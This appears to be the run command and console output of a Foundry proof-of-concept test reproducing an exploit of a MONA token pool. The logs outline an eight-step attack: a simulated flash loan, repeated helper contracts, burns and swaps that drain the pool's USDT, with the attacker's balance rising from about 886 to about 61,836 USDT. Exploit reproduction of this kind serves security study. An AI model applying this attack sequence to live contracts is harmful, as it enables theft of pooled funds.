```bash
forge test --mp test/2026-04/MONA/MONA_exploit.t.sol -vv
```

```bash
Ran 1 test for test/2026-04/MONA/MONA_exploit.t.sol:ContractTest
[PASS] testExploit() (gas: 15129673)
Logs:
  spender created balances:  987100000000000000000000 spender existed balances 987100000000000000000000
  [START ] EOA Attacker USDT Balance: 886.222536408085918824
  [START ] EOA Attacker MONA Balance: 0.000000000000000000
  ------------------------------------------------------------------------
  |
  1. Deal this address as if already get the flashLoan funds
  Assume we do flashLoan
  |
  2. Create contract to send USDT and do some things and repeat it 25times
  |
  3. Create dump contract to dump all the MONA to gain profit
  |
  4. Burn MONA on burnAddress
  |
  5. Swap USDT for MONA
  |
  6. Burn 0 to address dead
  |
  7. Dump all Mona to gain all USDT from the pool
  |
  8. Transfer to EOA all the USDT
  before transfer, assert if the final USDT is the same or more then it should be
  |
  [FINISH] EOA Attacker USDT Balance: 61836.530660330001762649
  [FINISH] EOA Attacker MONA Balance: 0.000000000000000000
  ------------------------------------------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 70.53s (69.48s CPU time)

Ran 1 test suite in 70.54s (70.53s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```